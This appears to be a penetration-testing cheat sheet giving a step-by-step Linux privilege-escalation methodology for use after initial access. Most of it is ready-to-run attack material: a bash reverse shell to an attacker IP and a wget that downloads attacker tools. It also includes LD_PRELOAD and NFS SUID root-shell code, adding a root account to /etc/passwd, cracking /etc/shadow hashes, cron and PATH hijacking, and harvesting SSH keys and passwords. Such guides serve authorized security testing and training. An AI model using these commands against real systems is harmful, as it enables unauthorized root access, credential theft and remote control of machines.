# Linux Privilege Escalation Methodology

Work through this checklist top-to-bottom after gaining initial access. Run automated tools early (they take time) while you manually check other vectors.

---

## 0. Stabilise Your Shell First

If you have a basic reverse shell, upgrade it before doing anything else:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or if python3 not available:
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 1. Situational Awareness

```bash
whoami && id
hostname
uname -a                     # kernel version — key for exploit search
cat /etc/os-release          # distro + version
cat /etc/*release            # fallback for older systems
cat /proc/version
env                          # check PATH for compilers/scripting languages
cat /etc/passwd              # enumerate users; grep '/home' for real users
history                      # may contain passwords or useful commands
```

**Network:**
```bash
ifconfig                     # interfaces — is this a pivot point?
ip route                     # network routes
netstat -ano                 # all connections, no name resolution, with timers
netstat -l                   # listening ports
```

**Running processes:**
```bash
ps aux                       # all processes with owner
ps axjf                      # process tree
```

**File hunting:**
```bash
ls -la /home/<user>          # always use -la, never plain ls
find / -writable -type d 2>/dev/null          # world-writable directories
find / -type f -perm -04000 -ls 2>/dev/null   # SUID/SGID files (see section 4)
find / -name "*.sh" 2>/dev/null | xargs ls -la # scripts that might be run by cron
find / -name id_rsa 2>/dev/null               # SSH private keys
```

---

## 2. Automated Enumeration (Run Early)

Transfer and run one of these while checking other vectors manually:

```bash
# LinPEAS — most comprehensive, redirect output
./linpeas.sh > linpeas_out.txt 2>&1

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh

# Linux Priv Checker
python3 linuxprivchecker.py

# LES — kernel exploit suggester
./les.sh
```

Transfer method (attacker → target):
```bash
# Attacker:
python3 -m http.server 8000
# Target:
wget http://<ATTACKER_IP>:8000/<tool> -O <tool> && chmod +x <tool>
```

---

## 3. Kernel Exploits

```bash
uname -a
cat /etc/os-release
```

Search for CVEs:
- Google: `linux kernel <version> privilege escalation exploit`
- `searchsploit linux kernel <version>`
- https://www.cvedetails.com/
- Run LES (Linux Exploit Suggester) against the target

**Caution:** A failed kernel exploit can crash the system. Understand the code before running it. Avoid on production systems.

---

## 4. Sudo Misconfigurations

```bash
sudo -l
```

For each binary listed, check **GTFOBins** (https://gtfobins.github.io/) for the sudo exploit path.

### LD_PRELOAD (if `env_keep+=LD_PRELOAD` appears in sudo -l output)

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_binary>
```

### Application Function Abuse (e.g. Apache2)
Some binaries with sudo rights have no GTFOBins entry but can leak data:
```bash
# Apache2 -f loads an alternate config — error output shows first line of the file
sudo apache2 -f /etc/shadow
```

---

## 5. SUID / SGID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Check each result on GTFOBins → filter by **SUID**: https://gtfobins.github.io/#+suid

### If nano (or another editor) has SUID set — two options:

**Option A — Read /etc/shadow and crack:**
```bash
nano /etc/shadow          # read hashes
nano /etc/passwd          # read passwd
# Copy both files to attacker, then:
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Option B — Add a root user to /etc/passwd:**
```bash
# Generate password hash on attacker:
openssl passwd -1 -salt hacker password123
# Append to /etc/passwd via the SUID editor:
# hacker:$1$hacker$<hash>:0:0:root:/root:/bin/bash
su hacker
```

---

## 6. Capabilities

```bash
getcap -r / 2>/dev/null
```

Check results on GTFOBins → filter by **Capabilities**.

Common example — `vim` or `view` with `cap_setuid`:
```bash
# From GTFOBins vim capabilities entry:
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","sh","-c","reset; exec sh")'
```

---

## 7. Cron Jobs

```bash
cat /etc/crontab
```

Look for:
- Scripts your user can **write to** → replace content with reverse shell
- Scripts that have been **deleted** but the cron entry still exists → create the script yourself
- Cron jobs using a **relative path** (not absolute) → PATH hijack (see section 8)

### Exploiting a writable cron script — reverse shell:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

### Exploiting a writable cron script — SUID on bash (simpler, no listener needed):
```bash
#!/bin/bash
chmod u+s /bin/bash
```
Then after the cron runs:
```bash
/bin/bash -p    # -p keeps elevated privileges; without it bash drops them
```

### Wildcard exploits in cron (tar, rsync, 7z)
If a cron script runs `tar *` or similar in a writable directory, filenames can be injected as flags. Research the specific binary on GTFOBins / HackTricks.

---

## 8. PATH Hijacking

Applies when a SUID binary (or cron script) calls another binary **without an absolute path**.

```bash
# Find writable directories
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# Check current PATH
echo $PATH
```

**Exploit:**
```bash
# Add a writable dir to PATH (e.g. /tmp or /home/user)
export PATH=/tmp:$PATH

# Create a fake binary with the name the SUID script calls
echo '/bin/bash' > /tmp/<binaryname>
chmod +x /tmp/<binaryname>

# Run the SUID script — it finds your fake binary first
./<suid_script>
```

---

## 9. NFS — no_root_squash

```bash
# On target — check exports
cat /etc/exports
# Look for "no_root_squash" on writable shares

# On attacker — enumerate mountable shares
showmount -e <TARGET_IP>

# On attacker — mount and create SUID binary AS ROOT
mkdir /tmp/nfsmount
mount -o rw <TARGET_IP>:/share /tmp/nfsmount

cat > /tmp/nfsmount/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
EOF

gcc /tmp/nfsmount/shell.c -o /tmp/nfsmount/shell
chmod +s /tmp/nfsmount/shell

# On target — run it
/share/shell
```

---

## 10. SSH Keys & Credential Files

```bash
find / -name id_rsa 2>/dev/null          # private keys
find / -name authorized_keys 2>/dev/null
cat ~/.ssh/id_rsa
history                                   # credentials in past commands
grep -r "password" /var/www/ 2>/dev/null  # web app config files
grep -r "password" /opt/ 2>/dev/null
```

If you find a root private key:
```bash
chmod 600 id_rsa
ssh -i id_rsa root@<TARGET_IP>
```

---

## Quick Reference

| Vector | Key Command |
|--------|-------------|
| Kernel version | `uname -a` |
| Sudo rights | `sudo -l` |
| SUID/SGID files | `find / -type f -perm -04000 -ls 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| NFS exports | `cat /etc/exports` |
| Users | `cat /etc/passwd \| grep /home` |

**GTFOBins:** https://gtfobins.github.io/ — check every binary found via sudo, SUID, or capabilities.
